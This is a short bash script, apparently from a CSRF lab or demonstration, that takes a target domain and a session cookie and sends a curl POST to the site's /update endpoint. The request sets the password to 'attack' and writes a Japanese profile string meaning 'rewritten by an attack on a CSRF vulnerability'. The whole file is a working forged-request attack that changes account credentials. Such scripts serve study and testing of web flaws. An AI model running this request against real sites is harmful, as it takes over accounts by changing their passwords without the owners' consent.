#!/bin/bash

domain=${1}
cookie=${2}

curl -v -X POST -d "password=attack" -d "profile=CSRF脆弱性への攻撃で書き換えた" -H "Cookie: ${cookie}" ${domain}/update
